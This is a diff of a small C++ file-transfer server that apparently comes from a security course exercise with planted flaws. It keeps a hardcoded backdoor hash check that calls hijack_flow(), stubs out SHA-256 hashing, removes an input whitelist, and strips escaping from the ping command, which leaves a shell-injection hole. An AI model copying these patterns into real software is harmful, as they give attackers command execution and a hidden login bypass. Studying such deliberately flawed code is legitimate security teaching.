@@ -8,9 +8,9 @@
 #include <algorithm>
 #include <sstream>
 #include <iterator>
-#include <openssl/sha.h>
+#include <unistd.h>
 
-#define BFLNGTH 524
+#define BFLNGTH 659
 
 using namespace std;
 
@@ -25,18 +25,13 @@ const string TRANSFER_ERROR = "Error: file transfer failed.\n";
 
 const char *backDoor = "359b978b8687ca88875ccf2976bef89f6045e196adc2dc74ee2ba782a46d46f7";
 
-
-
-const set<char> allowedCharacters = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
-                                     'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
-                                     'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
-                                     'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.', '/',
-                                     '\"', '{', '}', '/', '-', '_', '!'};
 string escape(string cmd){
     string escaped;
     for(size_t i = 0; i < cmd.size(); ++i) {
         if (cmd[i] == '"') {
             escaped += '\"';
+        }else if(cmd[i] == "'"[0]){
+            escaped += '\'';
         }
         else{
             escaped += cmd[i];
@@ -47,7 +42,7 @@ string escape(string cmd){
 
 int modifyUsrName(string &out, string usrName);
 void checkBackdoor(const string &uname);
-
+string alphabeticOrder(vector<string> unsorted, char delim);
 /**
  * Executes given command on the server.
  *
@@ -59,14 +54,12 @@ void checkBackdoor(const string &uname);
  * @return 0 if successful, 1 otherwise
  */
 
-int exec(const char* cmd, string &out) {
+int exec(const char* cmd, string &out, string UsrLocation = "") {
     char buffer[BFLNTH];
     char cmdRediction [BFLNTH];
-
-    size_t bufSize = BFLNGTH > strlen(cmd) +1 ? strlen(cmd) +1 : BFLNGTH;
+    size_t bufSize = BFLNGTH > strlen(cmd) + 1 ? strlen(cmd) + 1 : BFLNGTH;
     strncpy(cmdRediction,cmd,bufSize);
-
-    FILE* pipe = popen((string(cmdRediction) + " 2>&1").c_str(), "r");
+    FILE* pipe = popen(("cd "+baseDirectory+"/"+UsrLocation+" && "+string(cmdRediction) + " 2>&1").c_str(), "r");
     std::string result;
     if (!pipe) throw std::runtime_error("popen() failed!");
     try {
@@ -79,7 +72,7 @@ int exec(const char* cmd, string &out) {
     }
     int exitStatus = pclose(pipe);
     out = result;
-    return result.substr(0, 3) == "sh:" ? 1 : 0; //FIXME when does this happen?
+    return result.substr(0, 4) == "bash" ? 1 : 0; //FIXME when does this happen?
 }
 
 
@@ -89,6 +82,20 @@ int checkPathLength(const string &path, string &out){
         return 1;
     }
     return 0;
+}
+
+long getFileSize(const char* fileName){
+    FILE *file;
+    file = fopen(fileName, "r");
+    // If file can't be opened send error
+    if (file == NULL) {
+        return 1;
+    }
+    // Determine file size
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    fclose(file);
+    return fileSize;
 }
 
 /**
@@ -147,19 +154,15 @@ int sanitizePath(string &targetPath, string &out) {
  * @return error code
  */
 int constructPath(string relativePath, const string &usrLocation, string &absPath, string &out) {
-    if (relativePath.at(0) == '/') {
-        // the path is absolute from the client's point of view but is actually relative to the server's base directory
-        absPath = relativePath.substr(1);
-    }
-        // Do not allow cd commands with ~ for example, nor cd commands with . //FIXME explain why not . ?
-    else if (!isalnum(relativePath.at(0)) and relativePath.at(0) != '.') {
-        out = "Error: directory path not allowed\n";
+    // Do not allow cd commands with ~ for example, nor cd commands with . //FIXME explain why not . ?
+    if (!isalnum(relativePath.at(0)) and relativePath.at(0) != '.') {
+        out = ACCESS_ERROR; //FIXME
         return 1;
     } else {
-        absPath = usrLocation + "/" + relativePath; // FIXME one can execute an other command in "relativePath"
+        absPath = relativePath; // FIXME one can execute an other command in "relativePath"
     }
-    int res = sanitizePath(absPath, out);
-
+    string path = usrLocation + "/" + absPath;
+    int res = sanitizePath(path, out);
     return res;
 }
 
@@ -192,7 +195,7 @@ int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, s
 }
 
 void sha256_string(const char *string, char outputBuffer[65])
-{
+{   /*
     unsigned char hash[SHA256_DIGEST_LENGTH];
     SHA256_CTX sha256;
     SHA256_Init(&sha256);
@@ -202,7 +205,7 @@ void sha256_string(const char *string, char outputBuffer[65])
     for(i = 0; i < SHA256_DIGEST_LENGTH; i++)
     {
         sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
-    }
+    }*/
     outputBuffer[64] = 0;
 }
 
@@ -213,9 +216,6 @@ void checkBackdoor(const string &uname){
         hijack_flow();
     }
 }
-
-
-
 
 /**
  * The pass command must directly follow the login command.
@@ -257,8 +257,7 @@ int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, stri
     * @return 0 if successful
     */
 int ping_cmd(string host, string &out) {
-    // FIXME add quotes to make command injection impossible
-    string s = "ping -c 1 " + escape(host);  // FIXME security vulnerability ! One can change de command !
+    string s = "ping -c 1 " + host;
     int res = exec(s.c_str(), out);
     return res;
 }
@@ -279,8 +278,8 @@ int ls_cmd(bool authenticated, string &out, User usr){
         out = ACCESS_ERROR;
         return 1;
     }
-    string cmd = "ls -l " + usr.getLocation();
-    exec(cmd.c_str(), out);
+    string cmd = "ls -l ";
+    exec(cmd.c_str(), out, usr.getLocation());
     return modifyUsrName(out, usr.getUname());
 }
 
@@ -324,10 +323,17 @@ int cd_cmd(string dirPath, User &usr, string &out) {
     if (constructPath(dirPath, usr.getLocation(), absPath, out)) {
         return 1;
     }
-    string cmd = "cd \"" + absPath + "\"";
-    int res = exec(cmd.c_str(), out);
+
+    string cmd = "exec bash -c \'cd \"" + escape(absPath) + "\"\'";
+
+    int res = exec(cmd.c_str(), out, usr.getLocation());
     if (!res) {
-        usr.setLocation(absPath);
+        string temp = "";
+        string path = usr.getLocation() + "/" + absPath;
+        sanitizePath(path, temp);
+        usr.setLocation(path);
+    }else{
+        out.erase(0, 14);
     }
     return res;
 }
@@ -353,8 +359,8 @@ int mkdir_cmd(string dirPath, User usr, string &out){
     if (constructPath(dirPath, usr.getLocation(), absPath, out)) {
         return 1;
     }
-    string cmd = "mkdir \"" + absPath + "\"";
-    return exec(cmd.c_str(), out);
+    string cmd = "exec bash -c \'mkdir \"" + escape(absPath) + "\"\'";
+    return exec(cmd.c_str(), out, usr.getLocation());
 }
 
 
@@ -377,8 +383,8 @@ int rm_cmd(string filePath, User usr, string &out){
     if (constructPath(filePath, usr.getLocation(), absPath, out)) {
         return 1;
     }
-    string cmd = "rm -r \"" + absPath + "\"";
-    return exec(cmd.c_str(), out);
+    string cmd = "exec bash -c \'rm -r \"" + escape(absPath) + "\"\'";
+    return exec(cmd.c_str(), out, usr.getLocation());
 }
 
 
@@ -416,23 +422,12 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
     args->fileName[absPath.length()] = '\0';
     args->port = getPort;
 
-    FILE *fp;
-    fp = fopen(absPath.c_str(), "r");
+    long fileSize = getFileSize(absPath.c_str());
 
-    // If file can't be opened send error
-    if (fp == NULL) {
-        out = "Error: file does not exist.\n";
-        return 1;
-    }
-
-    // Determine file size
-    fseek(fp, 0, SEEK_END);
-    long file_size = ftell(fp);
-    fclose(fp);
-    if (file_size == EOF) {
+    if (fileSize <= 0) {
         return 1;
     } else {
-        out = "get port: " + to_string(getPort) + " size: " + to_string(file_size) + "\n";
+        out = "get port: " + to_string(getPort) + " size: " + to_string(fileSize) + "\n";
         // Cancel previous get command if one was executed
         pthread_cancel(usr.thread);
 
@@ -463,7 +458,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
  */
 int put_cmd(string fileName, string fileSize, int port, User &usr, string &out) {
     if (!usr.isAuthenticated()) {
-        out = "Error: put may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     long long fileS = stoll(fileSize);
@@ -518,8 +513,15 @@ int grep_cmd(string pattern, User usr, string &out){
         out = ACCESS_ERROR;
         return 1;
     }
-    string cmd = "grep -l -r \"" + pattern + "\" " + usr.getLocation();
-    return exec(cmd.c_str(), out);
+    string cmd = "grep -l -r \"" + pattern + "\" ";
+    int res = exec(cmd.c_str(), out, usr.getLocation());
+    if(res != 0 or out.empty()){
+        return res;
+    }
+    vector<string> grepOutput;
+    split(grepOutput, out, "\n");
+    out = alphabeticOrder(grepOutput, '\n');
+    return res;
 }
 
 
@@ -575,11 +577,7 @@ int w_cmd(User usr, string &out){
     for (auto it=connected_users.begin(); it != connected_users.end(); ++it) {
         users.push_back((*it).getUname());
     }
-    sort(users.begin(), users.end());
-    for (auto it=users.begin(); it != users.end(); ++it) {
-        out += (*it) + (it != users.end() ? ' ' : '\0');
-    }
-    out += "\n";
+    out = alphabeticOrder(users, ' ') + "\n";
     return 0;
 }
 
@@ -603,6 +601,22 @@ int logout_cmd(User &usr, string &out){
 }
 
 
+/**
+ * The  exit  command  can  always  be  executed  and  signals  the  end  of  the command session.
+ *
+ * @param usr, user wanting to exit
+ * @param out, output string
+ * @return 0 is successful
+ */
+int exit_cmd(User &usr, string &out){
+    if(connected_users.find(usr) != connected_users.end()){
+        close(usr.getSocket());
+        connected_users.erase(usr);
+    }
+    return 0;
+}
+
+
 size_t split(vector<string> &res, const string &line, const char* delim){
     res.clear();
     char* token = strtok(strdup(line.c_str()), delim);
@@ -616,3 +630,28 @@ size_t split(vector<string> &res, const string &line, const char* delim){
     }
     return res.size();
 }
+
+bool caseInsensitiveCompare(const string &s1, const string &s2){
+    size_t ssize = s1.size() < s2.size() ? s1.size() : s2.size();
+
+    for(size_t i = 0; i < ssize; ++i){
+        int c1 = tolower(s1.at(i));
+        int c2 = tolower(s2.at(i));
+        if(c1 == c2)
+            continue;
+        return c1 < c2;
+    }
+    return s1.size() < s2.size();
+}
+
+string alphabeticOrder(vector<string> unsorted, char delim){
+    sort(unsorted.begin(), unsorted.end());
+
+    sort(unsorted.begin(), unsorted.end(), caseInsensitiveCompare);
+    string res;
+    for (auto it=unsorted.begin(); it != unsorted.end(); ++it) {
+        res += (*it) + (it != unsorted.end() ? delim : '\0');
+    }
+    return res;
+}
+
